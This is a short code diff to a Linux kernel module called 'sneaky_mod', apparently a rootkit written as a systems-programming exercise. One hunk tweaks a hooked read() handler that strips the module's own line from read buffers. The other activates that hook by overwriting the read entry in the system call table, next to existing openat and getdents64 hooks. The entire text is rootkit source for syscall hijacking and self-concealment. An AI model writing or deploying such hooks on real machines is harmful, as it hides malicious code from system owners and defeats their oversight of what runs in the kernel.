@@ -137,7 +137,7 @@ asmlinkage int sneaky_sys_read(struct pt_regs * regs) {
   find_sneaky = strnstr(original_buffer, "sneaky_mod", strlen("sneaky_mod"));
   if (find_sneaky) {
     // then find the \n after it 
-    find_end = strnstr(find_sneaky, "\n", nread - ((void *)find_sneaky - (void *)original_buffer));
+    find_end = strnstr((void *)find_sneaky, "\n", nread - ((void *)find_sneaky - (void *)original_buffer));
     // delete the sneaky process
     if (find_end) {
       // calculate the next after sneakly len with \n
@@ -173,7 +173,7 @@ static int initialize_sneaky_module(void)
   
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
-  // sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
+  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
 
   // You need to replace other system calls you need to hack here
   
